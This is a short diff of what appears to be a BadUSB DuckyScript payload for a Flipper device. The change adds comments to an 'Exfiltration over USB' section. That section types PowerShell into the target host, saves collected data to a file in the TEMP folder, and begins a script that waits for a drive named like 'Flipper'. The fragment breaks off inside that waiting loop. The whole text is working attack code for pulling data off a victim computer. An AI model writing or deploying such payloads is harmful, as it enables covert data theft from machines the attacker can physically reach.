@@ -13,12 +13,16 @@ STRING $stringToSave = "YOUR_PAYLOADS_RESULT_GOES_HERE"
 ENTER
 
 REM Exfiltration over USB
+
+REM Remove if you exfil a file
 STRING $tempDirectory = $env:TEMP
 ENTER
 STRING $filePath = Join-Path -Path $tempDirectory -ChildPath "data.txt"
 ENTER
 STRING $stringToSave | Set-Content -Path $filePath
 ENTER
+
+REM Exfil script
 STRING $scriptContent = @'
 ENTER
 STRING while (-not (Get-WmiObject Win32_DiskDrive | Where-Object { $_.Model -like "*Flipper*" })) {
